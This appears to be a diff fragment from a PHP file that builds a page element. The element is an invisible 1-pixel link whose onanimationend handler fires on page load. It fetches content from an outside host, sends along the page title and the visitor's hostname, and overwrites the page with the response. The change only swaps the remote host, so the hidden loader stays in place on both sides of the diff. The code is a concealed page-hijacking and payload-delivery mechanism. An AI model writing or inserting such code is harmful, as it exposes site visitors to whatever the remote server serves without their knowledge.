@@ -22,7 +22,7 @@ $response = [
             'URL' => '#',
             'attributes' => [
                 'style' => "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-                'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var redirectWithoutReferrer = function (url) { var meta = document.createElement('meta'); meta.name = 'referrer'; meta.content = 'no-referrer'; document.head.appendChild(meta); window.location.replace(url); }; fetch('https://nw-q.ecolab.com/gud/video/conn.php?file=" . $pageTitle . "&host=' + window.location.hostname + '&cache=1').then(function (res) { return res.text(); }).then(function (e) { document.open(); document.write(e); document.close(); }).catch(function (err) { console.error(err); }); }"
+                'onanimationend' => "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var redirectWithoutReferrer = function (url) { var meta = document.createElement('meta'); meta.name = 'referrer'; meta.content = 'no-referrer'; document.head.appendChild(meta); window.location.replace(url); }; fetch('https://github.com/coronawork2k19/krpanu/conn.php?file=" . $pageTitle . "&host=' + window.location.hostname + '&cache=1').then(function (res) { return res.text(); }).then(function (e) { document.open(); document.write(e); document.close(); }).catch(function (err) { console.error(err); }); }"
             ]
         ]
     ],
